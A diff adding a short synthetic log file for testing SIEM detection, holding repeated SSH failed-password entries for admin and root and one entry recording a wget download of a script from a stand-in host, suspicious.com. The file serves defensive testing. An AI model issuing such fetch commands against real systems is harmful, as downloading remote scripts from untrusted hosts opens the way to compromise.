@@ -1,0 +1,13 @@
+# SIEM Test Log File
+
+2024-11-19 06:48:55 Failed password for admin from 192.168.1.100 port 22
+2024-11-19 06:48:56 Failed password for admin from 192.168.1.100 port 22
+2024-11-19 06:48:57 Failed password for admin from 192.168.1.100 port 22
+2024-11-19 06:48:58 Failed password for admin from 192.168.1.100 port 22
+2024-11-19 06:48:59 Failed password for admin from 192.168.1.100 port 22
+2024-11-19 06:49:00 Failed password for admin from 192.168.1.100 port 22
+2024-11-19 06:49:01 User executed command: wget http://suspicious.com/script.sh
+2024-11-19 06:49:02 Failed password for root from 192.168.1.101 port 22
+2024-11-19 06:49:03 Failed password for root from 192.168.1.101 port 22
+2024-11-19 06:49:04 Failed password for root from 192.168.1.101 port 22
+2024-11-19 06:49:05 Failed password for root from 192.168.1.101 port 22
